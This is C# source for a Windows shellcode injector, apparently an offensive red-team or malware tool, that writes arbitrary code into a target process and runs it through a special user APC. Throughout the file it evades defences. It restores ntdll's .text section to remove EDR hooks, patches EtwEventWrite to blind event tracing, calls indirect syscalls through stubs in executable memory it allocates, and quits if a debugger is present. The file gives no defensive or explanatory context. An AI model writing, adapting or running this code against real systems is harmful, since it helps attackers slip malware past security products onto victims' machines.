using System.Runtime.InteropServices;
using System.Diagnostics;
using PeNet;

class Program
{
    // DllImports
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerAttached);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    // constants
    const uint PROCESS_VM_READ = 0x0010;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    const uint THREAD_SET_CONTEXT = 0x0010;
    const uint THREAD_QUERY_INFORMATION = 0x0040;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;

    // Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    // Delegates
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtAllocateVirtualMemoryDelegate(
    IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
    ref uint RegionSize, uint AllocationType, uint Protect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtOpenProcessDelegate(
    out IntPtr ProcessHandle,
    uint DesiredAccess,
    ref OBJECT_ATTRIBUTES ObjectAttributes,
    ref CLIENT_ID ClientId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtWriteVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtProtectVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref uint RegionSize,
        uint NewProtect,
        out uint OldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtQueueApcThreadEx2Delegate(
        IntPtr ThreadHandle,
        IntPtr ReserveHandle,
        uint ApcFlags,
        IntPtr ApcRoutine,
        IntPtr ApcArgument1,
        IntPtr ApcArgument2,
        IntPtr ApcArgument3);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtCloseDelegate(IntPtr hObject);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtOpenThreadDelegate(
    out IntPtr ThreadHandle,
    uint DesiredAccess,
    ref OBJECT_ATTRIBUTES ObjectAttributes,
    ref CLIENT_ID ClientId);

    static byte[] LoadCode(string input)
    {
        if (input.StartsWith("0x"))
            return Convert.FromHexString(input.Substring(2));
        if (File.Exists(input))
            return File.ReadAllBytes(input);
        if (System.Text.RegularExpressions.Regex.IsMatch(input, @"^[0-9a-fA-F]+$") && input.Length % 2 == 0)
            return Convert.FromHexString(input);
        return Convert.FromBase64String(input);
    }

    static void unhook(NtProtectVirtualMemoryDelegate ntProtect)
    {
        try
        {
            byte[] ntdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
            var pe = new PeFile(ntdll);
            var textSection = pe.ImageSectionHeaders
                .First(s => s.Name == ".text");

            uint textRva = textSection.VirtualAddress;
            uint textSize = textSection.VirtualSize;

            IntPtr ntdllBase = GetModuleHandle("ntdll.dll");
            if (ntdllBase == IntPtr.Zero) return;

            IntPtr textAddrInMemory = IntPtr.Add(ntdllBase, (int)textRva);
            int textFileOffset = RvaToFileOffset(pe, textRva);

            byte[] freshText = new byte[(int)textSize];
            Array.Copy(ntdll, textFileOffset, freshText, 0, (int)textSize);

            IntPtr protectAddr = textAddrInMemory;
            uint protectSize = textSize;
            uint oldProtect;

            int protect = ntProtect(
                (IntPtr)(-1),
                ref protectAddr,
                ref protectSize,
                0x40,
                out oldProtect);

            if (protect != 0)
            {
                Console.WriteLine($"[!] ntprotectvirtualmemory Failed: 0x{protect:X}");
                return;
            }

            Marshal.Copy(freshText, 0, textAddrInMemory, (int)textSize);

            ntProtect(
            (IntPtr)(-1),
            ref protectAddr,
            ref protectSize,
            oldProtect,
            out oldProtect);

            Console.WriteLine($"[+] ntdll unhooked (.text: RVA=0x{textRva:X}, Size=0x{textSize:X})");
        } 
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Unhook failed: {ex.Message}");
        }
    }
    static int RvaToFileOffset(PeFile pe, uint rva)
    {
        foreach (var section in pe.ImageSectionHeaders)
        {
            if (rva >= section.VirtualAddress && rva < section.VirtualAddress + section.VirtualSize)
            {
                return (int)(rva - section.VirtualAddress + section.PointerToRawData);
            }
        }
        return -1;
    }

    static (uint ssn, IntPtr syscallAddr) ResolveSyscall(string funcName, PeFile pe, byte[] ntdllDisk, IntPtr ntdllBase)
    {
        var export = pe.ExportedFunctions.FirstOrDefault(f => f.Name == funcName);
        if (export == null) throw new Exception($"Export {funcName} not found");

        int funcOffset = RvaToFileOffset(pe, export.Address);
        if (funcOffset < 0) throw new Exception($"Cannot convert RVA for {funcName}");

        byte[] funcBytes = new byte[64];
        Array.Copy(ntdllDisk, funcOffset, funcBytes, 0, 64);

        uint ssn = 0;
        for (int i = 0; i < funcBytes.Length - 5; i++)
        {
            if (funcBytes[i] == 0x4C && funcBytes[i + 1] == 0x8B && funcBytes[i + 2] == 0xD1)
            {
                for (int j = i + 3; j < funcBytes.Length - 5; j++)
                {
                    if (funcBytes[j] == 0xB8)
                    {
                        ssn = BitConverter.ToUInt16(funcBytes, j + 1);
                        break;
                    }
                }
                break;
            }
        }

        IntPtr syscallAddr = IntPtr.Zero;
        for (int i = 0; i < funcBytes.Length - 2; i++)
        {
            if (funcBytes[i] == 0x0F && funcBytes[i + 1] == 0x05)
            {
                syscallAddr = IntPtr.Add(ntdllBase, (int)export.Address + i);
                break;
            }
        }

        if (ssn == 0 || syscallAddr == IntPtr.Zero)
            throw new Exception($"Failed to resolve syscall for {funcName} (SSN=0x{ssn:X}, Addr=0x{syscallAddr.ToInt64():X})");

        return (ssn, syscallAddr);
    }

    static byte[] BuildIndirectStub(uint ssn, IntPtr syscallAddr)
{
    byte[] stub = new byte[22];

    // mov r10, rcx
    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;

    // mov eax, SSN
    stub[3] = 0xB8;
    BitConverter.GetBytes(ssn).CopyTo(stub, 4);

    // jmp qword ptr [rip+0]
    stub[8] = 0xFF; stub[9] = 0x25;
    stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00;
    BitConverter.GetBytes(syscallAddr.ToInt64()).CopyTo(stub, 14);

    return stub;
}

    static T GetSyscallDelegate<T>(byte[] stub, IntPtr stubMem) where T : Delegate
    {
        Marshal.Copy(stub, 0, stubMem, stub.Length);
        return Marshal.GetDelegateForFunctionPointer<T>(stubMem);
    }

    static void etw(NtProtectVirtualMemoryDelegate ntProtect)
    {
        try
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero) return;

            IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
            if (etwEventWrite == IntPtr.Zero) return;

            IntPtr protectAddr = etwEventWrite;
            uint protectSize = 4;
            uint oldProtect;
            int status = ntProtect(
                (IntPtr)(-1),
                ref protectAddr,
                ref protectSize,
                PAGE_READWRITE,
                out oldProtect);

            if (status != 0)
            {
                Console.WriteLine($"[!] NtProtectVirtualMemory (ETW) failed: 0x{status:X}");
                return;
            }

            byte[] patch = { 0x48, 0x33, 0xC0, 0xC3 };
            Marshal.Copy(patch, 0, etwEventWrite, patch.Length);

            ntProtect(
                (IntPtr)(-1),
                ref protectAddr,
                ref protectSize,
                oldProtect,
                out oldProtect);

        } catch (Exception ex)
        {
            Console.WriteLine($"[!] ETW Patch Failed: {ex.Message}");
        }
    }

    static void Main(string[] args)
    {
        byte[] ntdllDisk = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
        var pe = new PeFile(ntdllDisk);
        IntPtr ntdllBase = GetModuleHandle("ntdll.dll");

        int stubCount = 7;
        IntPtr stubsRegion = VirtualAlloc(IntPtr.Zero, (uint)(stubCount * 32), 0x3000, 0x40);
        int offset = 0;

        var (ssnOpen, addrOpen) = ResolveSyscall("NtOpenProcess", pe, ntdllDisk, ntdllBase);
        var (ssnAlloc, addrAlloc) = ResolveSyscall("NtAllocateVirtualMemory", pe, ntdllDisk, ntdllBase);
        var (ssnWrite, addrWrite) = ResolveSyscall("NtWriteVirtualMemory", pe, ntdllDisk, ntdllBase);
        var (ssnProtect, addrProtect) = ResolveSyscall("NtProtectVirtualMemory", pe, ntdllDisk, ntdllBase);
        var (ssnApc, addrApc) = ResolveSyscall("NtQueueApcThreadEx2", pe, ntdllDisk, ntdllBase);
        var (ssnClose, addrClose) = ResolveSyscall("NtClose", pe, ntdllDisk, ntdllBase);
        var (ssnOpenThread, addrOpenThread) = ResolveSyscall("NtOpenThread", pe, ntdllDisk, ntdllBase);

        var ntOpen = GetSyscallDelegate<NtOpenProcessDelegate>(BuildIndirectStub(ssnOpen, addrOpen), IntPtr.Add(stubsRegion, offset));
        offset += 32;

        var ntAlloc = GetSyscallDelegate<NtAllocateVirtualMemoryDelegate>(BuildIndirectStub(ssnAlloc, addrAlloc), IntPtr.Add(stubsRegion, offset));
        offset += 32;

        var ntWrite = GetSyscallDelegate<NtWriteVirtualMemoryDelegate>(BuildIndirectStub(ssnWrite, addrWrite), IntPtr.Add(stubsRegion, offset));
        offset += 32;
        
        var ntProtect = GetSyscallDelegate<NtProtectVirtualMemoryDelegate>(BuildIndirectStub(ssnProtect, addrProtect), IntPtr.Add(stubsRegion, offset));
        offset += 32;
        
        var ntApc = GetSyscallDelegate<NtQueueApcThreadEx2Delegate>(BuildIndirectStub(ssnApc, addrApc), IntPtr.Add(stubsRegion, offset));
        offset += 32;

        var ntClose = GetSyscallDelegate<NtCloseDelegate>(BuildIndirectStub(ssnClose, addrClose), IntPtr.Add(stubsRegion, offset));
        offset += 32;

        var ntOpenThread = GetSyscallDelegate<NtOpenThreadDelegate>(BuildIndirectStub(ssnOpenThread, addrOpenThread), IntPtr.Add(stubsRegion, offset));
        offset += 32;

        if (System.Diagnostics.Debugger.IsAttached)
        {
            Environment.Exit(0);
        }

        bool isDebuggerPresent = false;
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
        if (isDebuggerPresent) Environment.Exit(0);

        try
        {
            if (args.Length == 0 || args[0] == "help" || args[0] == "-h" || args[0] == "--help")
            {
                Console.WriteLine("Usage: windows-codeinjector.exe <PID> <hex/base64 string or .bin file>");
                return;
            }

            if (args.Length < 2)
            {
                Console.WriteLine("Error: missing shellcode argument.");
                Console.WriteLine("Usage: windows-codeinjector.exe <PID> <hex/base64 string or .bin file>");
                return;
            }

            unhook(ntProtect);
            etw(ntProtect);

            Process target = Process.GetProcessById(int.Parse(args[0]));

            CLIENT_ID cid = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)target.Id,
                UniqueThread = IntPtr.Zero
            };

            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf<OBJECT_ATTRIBUTES>(),
                Attributes = 0x40
            };

            byte[] code = LoadCode(args[1]);

            // injection logic
            IntPtr hProcess;
            int processStatus = ntOpen(out hProcess, PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_QUERY_LIMITED_INFORMATION,
                ref oa, ref cid);

            if (processStatus != 0 || hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[!] NtOpenProcess Failed: 0x{processStatus:X}");
                return;
            }

            IntPtr baseAddress = IntPtr.Zero;
            uint regionSize = (uint)code.Length;
            int allocStatus = ntAlloc(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (allocStatus != 0)
            {
                Console.WriteLine($"[!] NtAllocateVirtualMemory Failed: 0x{allocStatus:X}");
                ntClose(hProcess);
                return;
            }

            uint bytesWritten;
            int wrtemem = ntWrite(hProcess, baseAddress, code, (uint)code.Length, out bytesWritten);

            if (wrtemem != 0)
            {
                Console.WriteLine($"[!] ntwritevirtualmemory Failed: 0x{wrtemem:X}");
                ntClose(hProcess);
                return;
            }

            uint oldProtect;
            int protect = ntProtect(hProcess, ref baseAddress, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);

            if (protect != 0)
            {
                Console.WriteLine($"[!] NtProtectVirtualMemory failed: 0x{protect:X}");
                ntClose(hProcess);
                return;
            }

            IntPtr hThread = IntPtr.Zero;
            foreach (ProcessThread thread in target.Threads)
            {
                try
                {
                    CLIENT_ID cidThr = new CLIENT_ID
                    {
                        UniqueProcess = IntPtr.Zero,
                        UniqueThread = (IntPtr)thread.Id
                    };

                    OBJECT_ATTRIBUTES oaThr = new OBJECT_ATTRIBUTES
                    {
                        Length = Marshal.SizeOf<OBJECT_ATTRIBUTES>(),
                        Attributes = 0x40
                    };

                    IntPtr tempthread;
                    int threadStatus = ntOpenThread(out tempthread, THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, ref oaThr, ref cidThr);

                    if (threadStatus == 0 && tempthread != IntPtr.Zero)
                    {
                        hThread = tempthread;
                        break;
                    }
                }
                catch { continue; }
            }

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[!] No suitable thread found");
                ntClose(hProcess);
                return;
            }

            int apc = ntApc(
                hThread,
                IntPtr.Zero,
                0x1, // QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
                baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero
                );

            if (apc == 0)
            {
                Console.WriteLine("[+] Success");
                Console.WriteLine($"Bytes Written: {bytesWritten}");
                ntClose(hThread);
                ntClose(hProcess);
            } else
            {
                Console.WriteLine($"[!] APC Failed: 0x{apc:X}");
            }
        } catch (Exception e)
        {
            Console.WriteLine($"An unknown error has occured: {e}");
        }
    }
}